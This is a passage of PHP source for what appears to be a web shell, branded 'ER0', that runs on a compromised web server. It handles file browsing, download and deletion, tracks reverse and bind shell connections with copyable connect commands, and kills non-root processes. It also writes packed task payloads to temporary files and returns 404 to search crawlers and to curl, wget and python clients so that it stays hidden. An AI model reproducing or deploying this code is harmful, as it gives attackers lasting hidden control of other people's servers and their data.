                return $hash;
            }
        }
        $xx = '';
        for ($c = 0; $c < strlen($hash); $c += 2) {
            $xx .= chr(hexdec($hash[$c] . $hash[$c + 1]));
        }
        return $xx;
    }

    public static function __charcode_enc($string)
    {
        $utf8String = mb_convert_encoding($string, 'UTF-8');
        $encoded = base64_encode($utf8String);
        return $encoded;
    }

    public static function __charcode_dec($encodedString)
    {
        $decoded = base64_decode($encodedString);
        $string = mb_convert_encoding($decoded, 'UTF-8', 'UTF-8');
        return $string;
    }

    public static function __compress_string($string) {
        return base64_encode(gzcompress($string, 9));
    }

    public static function __decompress_string($compressedString) {
        return gzuncompress(base64_decode($compressedString));
    }

    public static function __function_exist($serviceName, $ouput)
    {
        if ($ouput === 'raw') {
            return ("is_callable"($serviceName) && "function_exists"($serviceName)) ? true : false;
        } else {
            return ("is_callable"($serviceName) && "function_exists"($serviceName)) ? $GLOBALS['ER0_html']['on'] : $GLOBALS['ER0_html']['off'];
        }
    }

    public static function __get_iniget($name)
    {
        return "ini_get"($name) ? $GLOBALS['ER0_html']['on'] : $GLOBALS['ER0_html']['off'];
    }

    public static function __get_disfunc()
    {
        $disabled = "ini_get"('disable_functions');
        return $disabled ? "<span class='text-themecolor-red'>$disabled</span>" : '<span class="text-themecolor-green">All Functions Enable!</span>';
    }

    public static function __get_usergroup()
    {
        if (self::__function_exist('posix_getpwuid', 'raw') && self::__function_exist('posix_getgrgid', 'raw') && self::__function_exist('posix_geteuid', 'raw') && self::__function_exist('posix_getegid', 'raw')) {
            $uidInfo = @"posix_getpwuid"("posix_geteuid"());
            $gidInfo = @"posix_getgrgid"("posix_getegid"());

            $user = $uidInfo['name'];
            $uid = $uidInfo['uid'];
            $group = $gidInfo['name'];
            $gid = $gidInfo['gid'];
        } else {
            $user = self::__function_exist('get_current_user', 'raw') ? @"get_current_user"() : "????";
            $uid = self::__function_exist('getmyuid', 'raw') ? @"getmyuid"() : '????';
            $gid = self::__function_exist('getmygid', 'raw') ? @"getmygid"() : '????';
            $group = '?';
        }

        return [
            'user' => $user,
            'uid' => $uid,
            'group' => $group,
            'gid' => $gid
        ];
    }

    public static function __random_string($length = 10)
    {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $characters_length = strlen($characters);
        $random_string = '';

        for ($i = 0; $i < $length; $i++) {
            $random_string .= $characters[rand(0, $characters_length - 1)];
        }

        return $random_string;
    }

    public static function __server_proccess($pattern, $option, $return_user = true)
    {
        $command = "ps aux | grep " . $pattern;
        $output = Terminal::__execute($command);
        $lines = explode("\n", $output);
        $proccess = '';

        foreach ($lines as $line) {
            if (strpos($line, 'grep') !== false) {
                continue; // Skip the grep process itself
            }

            $parts = preg_split('/\s+/', $line);
            if (count($parts) < 2) {
                continue;
            }

            $user = $parts[0];
            $pid = $parts[1];

            if ($user != 'root') {
                switch ($option) {
                    case 'kill':
                        if (!str_contains(Terminal::__execute("kill -9 $pid"), 'failed')) {
                            $proccess .= "$pid, ";
                        }
                        break;

                    case 'get':
                        $proccess .= "$pid, ";
                        break;

                    default:
                        # code...
                        break;
                }
            }
        }

        $proccess = rtrim(trim($proccess), ',');
        #LOG(__server_proccess, get server proccess OK!)#
        return $return_user ? "$proccess ($user)" : $proccess;
    }

    public static function __construct_path($path)
    {
        $path = str_replace('//', '/', str_replace('#/#', '/', str_replace('//', '/', str_replace('#\#', '/', str_replace('/', '#/#', str_replace('\\', '#\#', $path))))));
        $path = str_replace('//', '/', ($GLOBALS['ER0_string']['sys'] == 'win' ? $path . __DIRECTORY_SEPARATOR__ : __DIRECTORY_SEPARATOR__ . $path));
        return $path;
    }

    public static function __create_path($path_array)
    {
        $fullpath = '';
        if (is_array($path_array)) {
            foreach ($path_array as $pathname) {
                $fullpath .= $GLOBALS['ER0_string']['sys'] == 'win' ? $path_array . __DIRECTORY_SEPARATOR__ : __DIRECTORY_SEPARATOR__ . $pathname;
            }
        } else {
            $fullpath .= $GLOBALS['ER0_string']['sys'] == 'win' ? $path_array . __DIRECTORY_SEPARATOR__ : __DIRECTORY_SEPARATOR__ . $path_array;
        }

        return ($GLOBALS['ER0_string']['sys'] == 'win' ? ltrim($fullpath, __DIRECTORY_SEPARATOR__) : rtrim($fullpath, __DIRECTORY_SEPARATOR__));
    }

    public static function __save_data($data, $value)
    {
        $cfgfile = __DIRECTORY_DATA__ . __DIRECTORY_SEPARATOR__ . $GLOBALS['ER0_data'][$data];
        $value = Utils::__charcode_enc(Utils::__string_enc(json_encode($value), true));
        if (Filesman::__save_file($cfgfile, $value)) {
            return true;
        } else {
            return false;
        }
    }
    public static function __remove_data($config, $option, $index)
    {
        $config = json_decode($config, true);

        $data = $config['data'];
        $dir = $config['dir'];
        $href = $config['titleHref'];
        $action = $config['action'];
        $jsonKey = $config['jsonKey'];
        $statusKey = $config['statusKey'];
        $tableHeader = $config['tableHeader'];
        $return = $config['return'];

        $data = is_array($data) ? $data[0] : $data;

        $cfgfilepath = __DIRECTORY_DATA__ . __DIRECTORY_SEPARATOR__ . $GLOBALS['ER0_data'][$data];
        if (!file_exists($cfgfilepath)) {
            return [
                'status' => 'log',
                'detail' => 'Config file not exists'
            ];
        }

        if (!is_writeable($cfgfilepath)) {
            return [
                'status' => 'log',
                'detail' => 'Cannot modify config file'
            ];
        }

        $cfgfile = Filesman::__read_file($cfgfilepath);
        $value = json_decode(Utils::__string_dec(Utils::__charcode_dec($cfgfile), true), true);
        $newvalue = [];
        $index_ = 0;
        $validStatus = false;
        $detail = 'NONE';
        foreach ($value as $val) {
            switch ($option) {
                case 'kill':
                    if ($index_ == $index) {
                        $validStatus = true;
                        $file = $val[$statusKey['file']];

                        $connection = Utils::__server_proccess($file, 'kill');
                        if (!str_contains($connection, 'Cannot')) {
                            $status = 'success';
                            $detail = "Success killed proccess : <b class='text-foreground'>$connection</b>";
                        } else {
                            $status = 'failed';
                            $detail = "Failed to kill proccess : <b class='text-foreground'>$connection</b>";
                        }

                        $newvalue[] = $val;
                    } else {
                        $newvalue[] = $val;
                    }
                    break;
                case 'delete':
                    if ($index_ == $index) {
                        $validStatus = true;
                        $path = rtrim($val[$statusKey['path']], __DIRECTORY_SEPARATOR__);
                        $file = $val[$statusKey['file']];
                        if ($data == 'network') {
                            $status = 'success';
                            $detail = "Success delete entry from config.";
                        } else if ($data == 'backdoor') {
                            $status = 'success';
                            $detail = "Success delete entry from config.";
                        } else {
                            if (unlink($path . __DIRECTORY_SEPARATOR__ . $file)) {
                                $status = 'success';
                                $detail = "Success delete file from config.";
                            } else {
                                $status = 'failed';
                                $detail = "Failed deleting file from config.";
                            }
                        }
                    } else {
                        $newvalue[] = $val;
                    }
                    break;

                case 'remove_data':
                    if ($index_ != $index) {
                        $newvalue[] = $val;
                    }
                    break;

                default:
                    $newvalue[] = $val;
                    break;
            }
            $index_++;
        }

        if (self::__save_data($data, $newvalue)) {
            if (!$validStatus) {
                $status = 'log';
                $detail = 'Success update data';
            }
        } else {
            if (!$validStatus) {
                $status = 'log';
                $detail = 'Failed update data';
            }
        }

        #LOG(__remove_data, data removed from config!)#

        return [
            'status' => $status,
            'detail' => $detail
        ];
    }

    /**
     * example:
     * $data_config = array(
     *   'data' => stringData or [stringData, log],
     *   'dir' => currentDir,
     *   'titleHref' => null or ['key' => [['param','value'], ['param','value']]],
     *   'action' => [[['button', 'id'],'option', 'label'],['href','option', 'label'],['button','option', 'label']],
     *   'jsonKey' => ['key1',['key2','type','id']],
     *   'statusKey' => ['path' => 'keyPath','file' => 'keyFile'],
     *   'tableHeader' => null or ['header1','header2'],
     *   'return' => 'table' or 'tbody' or 'array'
     *  );
     */

    /*
 $data_config = array(
            'data' => ["network"],
            'dir' => $dir,
            'hiddenVal' => ['f','n','t'],
            'titleHref' => null,
            'action' => [[['button', 'connectionId'], 'use_hidden', 'bind', 'NET'], [['button', 'commandId'], 'copy', 'copy cmd'], ['button', 'delete', 'delete']],
            'jsonKey' => ['n', 't', 'u', 'pw', ['con', ['input', 'disabled', 'ifContain=php'], 'connectionId'], ['cmd', ['input', 'disabled'], 'commandId']],
            'statusKey' => ['path' => 'f', 'file' => 'n'],
            'rowStyle' => ['n' => ['font-bold', 'text-['.$GLOBALS['ER0_config']['main_color'].']'], 't' => ['font-normal', 'text-themecolor-orange400'], 'pw' => [['font-bold', 'ifNot=none'], ['text-themecolor-green', 'ifNot=none']]],
            'tableHeader' => ['File', 'Type', 'Use', 'Password', 'Connection', 'Connect CMD'],
            'return' => 'table'
        );
     */
    public static function __get_data($config)
    {
        $data = $config['data'];
        $dir = $config['dir'];
        $hiddenVal = $config['hiddenVal'];
        $href = $config['titleHref'];
        $action = $config['action'];
        $jsonKey = $config['jsonKey'];
        $statusKey = $config['statusKey'];
        $showStatus = (isset($config['showStatus']) ? $config['showStatus'] : true);
        $rowStyle = $config['rowStyle'];
        $tableHeader = $config['tableHeader'];
        $return = $config['return'];

        $updateConfig = $config;
        $updateConfig['return'] = 'tbody';
        $logging = 'off';

        if (is_array($data)) {
            $data = $data[0];
            $logging = 'on';
        }

        $cfg = __DIRECTORY_DATA__ . __DIRECTORY_SEPARATOR__ . $GLOBALS['ER0_data'][$data];
        $output = 'File Not Exist!';

        if (file_exists($cfg)) {
            $cfg = Filesman::__read_file($cfg);
            $json = json_decode(Utils::__string_dec(Utils::__charcode_dec($cfg), true), true);

            if ($return == 'table' || $return == 'tbody') {

                $header = '
                <th scope="col" class="px-6 py-3">Filename</th>
                <th scope="col" class="px-6 py-3">Path</th>
                ';

                if ($tableHeader != null) {
                    $header = '';
                    foreach ($tableHeader as $thead) {
                        $header .= '<th scope="col" class="px-6 py-3">' . $thead . '</th>';
                    }
                }

                $logging = ($logging == 'on') ? "<script>console.table(JSON.parse(`" . json_encode($json) . "`))</script>" : '';

                $outputTable = '
                <table id="table-' . $data . '" class="table-auto text-sm w-full text-themecolor-400">
                <thead id="table-head-' . $data . '" class="text-xs uppercase bg-themecolor-700 text-themecolor-400 rounded-t-lg">
                    <tr class="border-b sticky top-0 bg-themecolor-900 p-2 border-themecolor-600">
                        ' . $header . '
                        ' . ($showStatus ? '<th scope="col" class="px-6 py-3 text-center">Status</th>' : '') . '
                        <th scope="col" class="px-6 py-3">Action</th>
                    </tr>
                </thead>
                <tbody id="table-body-' . $data . '">';
                $outputTbody = '';
                $index_ = 0;
                $onTime = true;
                $extra = '';
                foreach ($json as $dataValue) {
                    $outputTbody .= '<tr class="cls-' . $data . ' border-b border-themecolor-600">';

                    foreach ($jsonKey as $keys) {

                        if (Terminal::__check_execute() && $data == 'network' && $onTime) {
                            $prc = Utils::__server_proccess($dataValue[$statusKey['file']], 'get', false);
                            $extra = Utils::__server_proccess($dataValue[$statusKey['file']], 'get', true);
                            if (!empty($prc) && $dataValue['t'] == 'reverse') {
                                $nmf = __DATA_DIR_URL__.'/tmp/'.basename($GLOBALS['ER0_string']['task_dir']) .'/'. $dataValue['n'].'_net_proc.php';

                                $outputTbody .= '<script>
                                evlOnClose = btoa("task_manager(`network`,`'.$dataValue['n'].'_net_proc.php`,`remove`,`$("#proccessId_'.$index_.'").val("()")`)");

                                notifyCheckPrc_' . $index_ . ' = {
                                    type : "failed",
                                    detail : charcodeEnc("Connection from <b class=\'text-foreground\'>' . $dataValue['con'] . '</b> closed!"),
                                    redirect : false,
                                    icon : "<i class=\'bx bx-sitemap bx-tada text-5xl\' ></i>",
                                    status : "Connection Closed",
                                    color : "red",
                                    delay : 3000,
                                };
                                notifyCheckPrc_' . $index_ . ' = JSON.stringify(notifyCheckPrc_' . $index_ . ');
                                const checker_' . $index_ . ' = new ConnectionChecker("'.$nmf.'?chkprc=' . $dataValue[$statusKey['file']] . '", "' . $dataValue['con'] . '", notifyCheckPrc_' . $index_ . ',true,evlOnClose);
                                checker_' . $index_ . '.start();
                                </script>';
                            }
                            $onTime = false;
                        }

                        $inputType = (is_array($keys) ? $keys[1] : '');
                        $key = (is_array($keys) ? $keys[0] : $keys);
                        $emptyValue = $key == 'EMPTY' ? true : false;
                        $hrefHtml = '';
                        $statusPath = $dataValue[$statusKey['path']] . __DIRECTORY_SEPARATOR__ . $dataValue[$statusKey['file']];
                        $status = (file_exists($statusPath) && is_readable($statusPath)) ? ['green', 'OK'] : ['red', 'ERROR'];
                        $styling = 'font-bold text-foreground';
                        if ($rowStyle != null) {

                            foreach ($rowStyle as $keyStyle => $styles) {
                                if ($key == $keyStyle) {
                                    $styling = '';
                                    foreach ($styles as $stl) {
                                        if (is_array($stl)) {
                                            $regex_1 = explode('=', $stl[1]);
                                            if ($regex_1[0] == 'ifNot') {
                                                if (!str_contains($dataValue[$key], $regex_1[1])) {
                                                    $styling .= $stl[0] . ' ';
                                                } else {
                                                    $styling .= 'text-themecolor-400 font-normal';
                                                }
                                            }
                                        } else {
                                            $styling .= $stl . ' ';
                                        }
                                    }
                                }
                            }
                            $styling = trim($styling);
                        }

                        if ($href != null) {
                            $hrefHtml = 'href="#';
                            $isSameKey = false;
                            foreach ($href as $key__ => $value__) {
                                $isSameKey = $key == $key__ ? true : false;
                                foreach ($value__ as $hrefValue__) {
                                    $hrefHtml .= "{$hrefValue__[0]}={$hrefValue__[1]}&";
                                }
                            }

                            $hrefHtml = $isSameKey ? rtrim($hrefHtml, '&') . '"' : '';

                            $outputTbody .= '
                                <td scope="row" class="px-6 py-4 whitespace-nowrap ' . $styling . '">
                                    <div class="flex items-center justify-start gap-2">
                                        <a class="w-full hover:brightness-75" ' . $hrefHtml . '><span class="max-w-[30rem] truncate" title="' . $dataValue[$key] . '">' . $dataValue[$key] . '</span></a>
                                    </div>
                                </td>
                            ';
                        } else {
                            $isDisableInput = '';
                            $isInput = $inputType;
                            if (is_array($inputType)) {
                                $isInput = $inputType[0];
                                if (!empty($inputType[2]) || $inputType[2] != null) {
                                    $regex_ = explode('=', $inputType[2]);
                                    if (str_contains($dataValue[$keys[0]], $regex_[1])) {
                                        $isDisableInput = $inputType[1];
                                    } else {
                                        $isDisableInput = '';
                                    }
                                } else {
                                    $isDisableInput = $inputType[1];
                                }
                            }

                            $textHtml = ($isInput == 'input' ? '<input ' . $isDisableInput . ' type="text" id="' . $keys[2] . '_' . $index_ . '" value="' . ($emptyValue ? $extra : $dataValue[$keys[0]]) . '" class="block pt-2 text-sm border rounded-lg w-auto max-w-[30rem] bg-themecolor-800 border-themecolor-600 placeholder-themecolor-400 focus:ring-primary focus:border-primary">' : '<span class="w-full hover:brightness-75"><span class="block max-w-[15rem] truncate" title="' . ($emptyValue ? '' : $dataValue[$key]) . '">' . ($emptyValue ? '' : $dataValue[$key]) . '</span></span>');
                            $outputTbody .= '
                                <td scope="row" class="px-6 py-4 whitespace-nowrap ' . $styling . '">
                                    <div class="flex items-center justify-start gap-2">
                                        ' . $textHtml . '
                                    </div>
                                </td>
                            ';
                        }
                    }
                    //status

                    if ($showStatus) $outputTbody .= '<td class="px-6 py-4"><div class="flex items-center justify-center"><span class="text-' . $status[0] . '-400">' . $status[1] . '</span></div></td>';

                    $actionBtn = '';

                    foreach ($action as $array) {
                        $hiddenValue = 'null';
                        if ($array[1] == 'use_hidden') {
                            if ($hiddenVal != null) {
                                $hiddenValue = [];
                                $hiddenValue['func'] = $array[3];
                                foreach ($hiddenVal as $hide) {
                                    $hiddenValue[$hide] = $dataValue[$hide];
                                }
                                $hiddenValue = '`' . Utils::__charcode_enc(json_encode($hiddenValue)) . '`';
                            }
                        }
                        $isArray = is_array($array[0]) ? true : false;
                        $typ = $isArray ? $array[0][0] : $array[0];
                        $action__ = $typ == 'href' ? "href='#action={$GLOBALS['ER0_string']['filesman']}&dir=" . Utils::__string_enc($dataValue[$statusKey['path']]) . "&file=" . Utils::__string_enc($dataValue[$statusKey['file']]) . "&opt={$array[1]}'" : 'onclick="DD(`' . Utils::__charcode_enc(json_encode($updateConfig)) . '`,`' . Utils::__charcode_enc($array[1]) . '`, ' . $index_ . ',' . (is_array($array[0]) ? "`{$array[0][1]}_$index_`" : 'null') . ',' . $hiddenValue . ')"';
                        $actionBtn .= '
                        <a ' . $action__ . ' class="text-sm cursor-pointer font-medium inline-flex items-center whitespace-pre rounded w-auto text-foreground bg-themecolor-800 hover:bg-primary px-2 py-1 border border-themecolor-600">' . ucwords($array[2]) . '</a>
                        ';
                    }
                    if ($showStatus) {
                        if ($status[0] == 'red') $actionBtn = '<a onclick="DD(`' . Utils::__charcode_enc(json_encode($updateConfig)) . '`,`' . Utils::__charcode_enc('remove_data') . '`, ' . $index_ . ',null)" class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto text-foreground bg-themecolor-800 hover:bg-primary px-2 py-1 border border-themecolor-600">Remove</a>';
                    }

                    $outputTbody .= '<td class="px-6 py-4"><div class="flex items-center gap-2">' . $actionBtn . '</div></td>';

                    $outputTbody .= '</tr>';
                    $index_++;
                    $onTime = true;
                }
                $outputTable .= $outputTbody . '</tbody>
                </table>';
                $output = $return == 'tbody' ? $outputTbody : $outputTable;
            } else {
                $output = [];
                foreach ($json as $data) {
                    $output[] = $data;
                }
            }
        }
        return $output;
    }
}

/** CLASS REQUEST ============================================================================ */

class Request
{
    public static function __get_request($param)
    {
        $value = isset(${"_GET"}[$param]) ? ${"_GET"}[$param] : '';
        $value = fix_magic_quote($value);
        return $value;
    }

    public static function __post_request($param)
    {
        $value = isset(${"_POST"}[$param]) ? htmlspecialchars(${"_POST"}[$param], ENT_QUOTES, 'UTF-8') : '';
        $value = fix_magic_quote($value);
        return $value;
    }

    public static function __server($param)
    {
        return ${"_SERVER"}[$param];
    }

    public static function __block_bot()
    {
        // block search engine bot
        if (isset($_SERVER['HTTP_USER_AGENT']) && (preg_match('/bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|client|python|libwww/i', $_SERVER['HTTP_USER_AGENT']))) {
            header("HTTP/1.0 404 Not Found");
            header("Status: 404 Not Found");
            die();
        } elseif (!isset($_SERVER['HTTP_USER_AGENT'])) {
            header("HTTP/1.0 404 Not Found");
            header("Status: 404 Not Found");
            die();
        }
    }

    public static function __post_controls()
    {
        // SINGLE REQUEST GET & SAVE =============================================
        if (isset(${"_POST"}['key']) && self::__post_request('key') == 'EXD') {
            $action = Utils::__string_dec(self::__post_request('action'));
            $dir = Utils::__string_dec(self::__post_request('dir'));
            $tools = Utils::__string_dec(self::__post_request('tools'));
            $file = Utils::__string_dec(self::__post_request('file'));
            $dirname = Utils::__string_dec(self::__post_request('dirname'));
            $opt = Utils::__string_dec(self::__post_request('opt'));
            $dir = Utils::__construct_path($dir);
            chdir($dir);

            $container = Utils::__charcode_enc('tools_container');
            $content = Utils::__charcode_enc(Routes::__gets($action, $dir, $tools, $file, $dirname, $opt));

            $response = [
                'dir_con' => Utils::__charcode_enc('dir_container'),
                'dir_content' => Utils::__charcode_enc(FileManager::__get_dirlist($dir)),
                'cwd_con' => Utils::__charcode_enc('cwd_container'),
                'cwd_content' => Utils::__charcode_enc(Frontend::__get_pwd($dir)),
                'menu_con' => Utils::__charcode_enc('menu_container'),
                'menu_content' => Utils::__charcode_enc(Routes::__gets('menu', $dir, $tools, null, null, null)),
                'container' => $container,
                'content' => $content
            ];

            header('Content-Type: application/json');
            echo json_encode($response);
            exit();
        }

        if (isset(${"_POST"}['key']) && self::__post_request('key') == 'SVD') {
            $name = Utils::__charcode_dec(self::__post_request('name'));
            $value = Utils::__charcode_dec(self::__post_request('value'));
            $action = Utils::__string_dec(self::__post_request('action'));
            $dir = Utils::__string_dec(self::__post_request('dir'));
            $tools = Utils::__string_dec(self::__post_request('tools'));
            $opt = Utils::__string_dec(self::__post_request('opt'));
            $dir = Utils::__construct_path($dir);
            chdir($dir);

            $data = Routes::__updates($action, $dir, $tools, $opt, $name, $value);
            $data = json_decode($data, true);
            $response = [
                'dir_con' => Utils::__charcode_enc('dir_container'),
                'dir_content' => Utils::__charcode_enc(FileManager::__get_dirlist($dir)),
                'status' => Utils::__charcode_enc($data['status']),
                'detail' => Utils::__charcode_enc($data['detail']),
                'redirect' => $data['redirect'],
                'temp' => Utils::__charcode_enc($data['temp'])
            ];

            header('Content-Type: application/json');
            echo json_encode($response);
            exit();
        }

        // BULK REQUEST GET & SAVE =============================================
        if (isset(${"_POST"}['key']) && self::__post_request('key') == 'BLK') {
            $action = Utils::__string_dec(self::__post_request('actions'));
            $value = Utils::__string_enc(self::__post_request('value'));
            $count = self::__post_request('count');
            $dir = Utils::__string_dec(self::__post_request('dir'));
            $dir = Utils::__construct_path($dir);
            chdir($dir);

            $container = Utils::__charcode_enc('tools_container');
            $content = Utils::__charcode_enc(Routes::__bulk($dir, $action, $value, $count));

            $response = [
                'dir_con' => Utils::__charcode_enc('dir_container'),
                'dir_content' => Utils::__charcode_enc(FileManager::__get_dirlist($dir)),
                'cwd_con' => Utils::__charcode_enc('cwd_container'),
                'cwd_content' => Utils::__charcode_enc(Frontend::__get_pwd($dir)),
                'menu_con' => Utils::__charcode_enc('menu_container'),
                'menu_content' => Utils::__charcode_enc(Routes::__gets('menu', $dir, null, null, null, null)),
                'container' => $container,
                'content' => $content
            ];

            header('Content-Type: application/json');
            echo json_encode($response);
            exit();
        }

        if (isset(${"_POST"}['key']) && self::__post_request('key') == 'BLKSV') {
            $action = self::__post_request('action');
            $source = Utils::__string_dec(self::__post_request('source'));
            $value = Utils::__charcode_dec(self::__post_request('value'));
            $dir = Utils::__string_dec(self::__post_request('dir'));
            $dir = Utils::__construct_path($dir);
            chdir($dir);
            // Check if decoding was successful

            $data = Routes::__bulk_save($dir, $action, $source, $value);
            $data = json_decode($data, true);
            $response = [
                'dir_con' => Utils::__charcode_enc('dir_container'),
                'dir_content' => Utils::__charcode_enc(FileManager::__get_dirlist($dir)),
                'status' => Utils::__charcode_enc($data['status']),
                'detail' => Utils::__charcode_enc($data['detail'])
            ];

            header('Content-Type: application/json');
            echo json_encode($response);
            exit();
        }

        if (isset(${"_POST"}['key']) && self::__post_request('key') == 'RDA') {
            $config = Utils::__charcode_dec(self::__post_request('config'));
            $option = Utils::__charcode_dec(self::__post_request('option'));
            $index = self::__post_request('index');
            $value = (!empty(self::__post_request('value')) ? Utils::__charcode_dec(self::__post_request('value')) : null);
            // Check if decoding was successful

            $res = Utils::__remove_data($config, $option, $index);

            $data_config = json_decode($config, true);
            $updateList = Utils::__charcode_enc(Utils::__get_data($data_config));
            $dataKey = is_array($data_config['data']) ? $data_config['data'][0] : $data_config['data'];
            $updates = '$(`#table-body-' . $dataKey . '`).html(charcodeDec(`' . $updateList . '`));';
            if($dataKey == 'backdoor'){
                $updates .= 'for (let i = 0; i <= document.getElementsByClassName("cls-backdoor").length; i++) { $("#found-bd").text(i); }';
            }
            $response = [
                'status' => Utils::__charcode_enc($res['status']),
                'detail' => Utils::__charcode_enc($res['detail']),
                'update' => Utils::__charcode_enc($updates)
            ];

            header('Content-Type: application/json');
            echo json_encode($response);
            exit();
        }

        if (isset(${"_POST"}['key']) && self::__post_request('key') == 'CHKPROC') {
            $patern = Utils::__charcode_dec(self::__post_request('patern'));
            $rtype = Utils::__charcode_dec(self::__post_request('rtype'));
            $suser = self::__post_request('suser');

            $response = Utils::__server_proccess($patern, $rtype, $suser);

            header('Content-Type: application/json');
            echo Utils::__charcode_enc($response);
            exit();
        }

        if (isset(${"_POST"}['key']) && self::__post_request('key') == 'mktmpfile') {
            $name = Utils::__charcode_dec(self::__post_request('name'));
            $task = Utils::__charcode_dec(self::__post_request('task'));
            $action = Utils::__charcode_dec(self::__post_request('action'));
            $optionalData = Utils::__charcode_dec(self::__post_request('optionalData'));
            $status = false;
            $val = null;
            $message = null;

            if($optionalData != 'none'){
                $optionalData = json_decode($optionalData,true);
            }

            switch ($task) {
                case 'network':
                    $val = $GLOBALS['ER0_temp_content']['check_proccess'];
                    break;
                case 'backdoor':
                    $val = $GLOBALS['ER0_temp_content']['scan_backdoor_proccess'];
                    $val = gzinflate(base64_decode($val));
                    $val = str_replace('#DATAFILE#', $optionalData['datafile'], $val);
                    $val = str_replace('#BASEDIR#', $optionalData['basedir'], $val);
                    $val = str_replace('#NAMELIST#', $optionalData['namelist'], $val);
                    $val = str_replace('#CONTENTLIST#', $optionalData['contentlist'], $val);
                    $val = str_replace('#SCANTYPE#', $optionalData['scantype'], $val);
                    $val = str_replace('#EXTENSION#', $optionalData['extension'], $val);
                    $val = base64_encode(gzdeflate($val));
                    break;
            }

            $val = gzinflate(base64_decode($val));
            $temp_path = $GLOBALS['ER0_string']['task_dir'];
            $task_path = $temp_path . __DIRECTORY_SEPARATOR__ . $name;

            if($action == 'add'){
                if($val != null){
                    if(!file_exists($temp_path)){
                        mkdir($temp_path, 0777);
                    }
                    if(Filesman::__save_file($task_path,$val)){
                        $status = true;
                        $message = "New task added.\nPID -> ".pathinfo($name, PATHINFO_FILENAME);
                    }
                }
            } else {
                if(file_exists($task_path)){
                    if(unlink($task_path)){
                        $status = true;
                        $message = "Task removed.\nPID -> ".pathinfo($name, PATHINFO_FILENAME);
                    }
                }
            }

            if($message != null) $message = Utils::__charcode_enc($message);

            header('Content-Type: application/json');
            echo json_encode(['status' => $status, 'message' => $message]);
            exit();
        }

        if (isset(${"_POST"}['cset']) && isset(${"_POST"}['cdir'])) {
            $data = array(
                'font_face' => Utils::__string_enc($GLOBALS['ER0_config']['font_face'], true),
                'charset' => Utils::__string_enc(self::__post_request('cset'), true),
                'timeformat' => Utils::__string_enc($GLOBALS['ER0_config']['timeformat'], true),
                'params_enc' => Utils::__string_enc($GLOBALS['ER0_config']['params_enc'], true),
                'show_filemanager' => Utils::__string_enc($GLOBALS['ER0_config']['show_filemanager'], true),
                'show_fullpath' => Utils::__string_enc($GLOBALS['ER0_config']['show_fullpath'], true),
                'show_foldersize' => Utils::__string_enc($GLOBALS['ER0_config']['show_foldersize'], true),
                'show_lastmodtime' => Utils::__string_enc($GLOBALS['ER0_config']['show_lastmodtime'], true),
            );

            Session::__save_cookie($data);
            header('Location: ' . __SCRIPT__ . '#action=' . $GLOBALS['ER0_string']['filesman'] . '&dir=' . self::__post_request('cdir') . '');
            exit();
        }

        // TOOLS REQUEST =============================================
            Upload::__upload_function();
    Terminal::__terminal();
        loaded_routes_function();
    }

    public static function __get_controls()
    {
        if (isset(${'_GET'}['logout'])) {
            Session::__session_manager('UNSET', null, 'usr');
            Session::__session_manager('UNSET', null, 'psw');
            header('Location: ' . __SCRIPT_URL__);
        }

        if (isset(${"_GET"}['raw']) || isset(${"_GET"}['down']) || isset(${"_GET"}['content'])) {

            $israw = isset(${"_GET"}['raw']) ? true : false;
            $iscnt = isset(${"_GET"}['content']) ? true : false;
            $isdown = isset(${"_GET"}['down']) ? true : false;
            $isx = isset(${"_GET"}['x']) ? true : false;
            $iss = isset(${"_GET"}['s']) ? true : false;

            // Path to the file
            $filePath = $iscnt ? Utils::__string_dec(self::__get_request('content')) : ($israw ? Utils::__string_dec(self::__get_request('raw')) : Utils::__string_dec(self::__get_request('down')));

            // Check if the file exists
            if (!file_exists($filePath)) {
                die('File not found.');
            }

            $path = dirname($filePath);
            $file = basename($filePath);

            chdir($path);

            // Get the file content
            $fileContent = Filesman::__read_file($file);
            $ext = pathinfo($file, PATHINFO_EXTENSION);

            if ($isdown && !$israw && !$isx) {
                Filesman::__download_file($filePath, $file, 1024);
                exit();
            }

            // Output the file content
            if ($iscnt) {
                if (!$isdown && !$israw && !$isx) {
                    header('Content-Description: View Raw');
                    header('Content-Type: ' . Filesman::__get_filetype($file));
                    header('Content-Disposition: inline; filename="' . $file . '"');
                    header('Content-Length: ' . strlen($fileContent));

                    ob_clean();
                    flush();

                    echo $fileContent;
                    exit();
                } else {
                    echo '<script>location.href=`' . __SCRIPT__ . '`</script>';
                }
            }



            if ($israw && !$isdown) {
                $content = '';
                $preview = '';

                if (in_array($ext, $GLOBALS['ER0_array']['doc_ext'])) {
                    header('Content-Description: View Raw');
                    header('Content-Type: ' . Filesman::__get_filetype($file));
                    header('Content-Disposition: inline; filename="' . $file . '"');
                    header('Content-Length: ' . strlen($fileContent));

                    ob_clean();
                    flush();

                    echo $fileContent;
                    exit();
                }


                if ($isx && !$isdown) {
                    $err =  "
    <pre>
      ███████╗██████╗ ██████╗  ██████╗ ██████╗
      ██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔══██╗
      █████╗  ██████╔╝██████╔╝██║   ██║██████╔╝
      ██╔══╝  ██╔══██╗██╔══██╗██║   ██║██╔══██╗
      ███████╗██║  ██║██║  ██║╚██████╔╝██║  ██║██╗██╗██╗
      ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝╚═╝

     Detail : " . htmlspecialchars(Utils::__string_dec(self::__get_request('x'))) . "</pre>
     <div style='background:white; height:5px; width:100%; margin:10px 0 10px 0;'></div>";
                }

                if (in_array($ext, $GLOBALS['ER0_array']['img_ext'])) {
                    $preview .= '
                    <img style="height: auto; max-width: 15rem; border-radius: .5rem;" src="' . __SCRIPT__ . '?content=' . Utils::__string_enc($filePath) . '">
                    <a href="' . __SCRIPT__ . '?raw=' . Utils::__string_enc($filePath) . '&s' . ($isx ? '&x=' . self::__get_request('x') : '') . '" style="max-width:15rem; margin-top:10px;"><button style="width:100%;">Show String</button></a>
                    ';
                    if ($iss) {
                        $content .= htmlspecialchars($fileContent);
                    }
                } else if (in_array($ext, $GLOBALS['ER0_array']['vid_ext'])) {
                    $preview .= '
                    <video controls loop style="height: auto; max-width: 15rem; border-radius: .5rem;" src="' . __SCRIPT__ . '?content=' . Utils::__string_enc($filePath) . '"  type="' . Filesman::__get_filetype($file) . '">
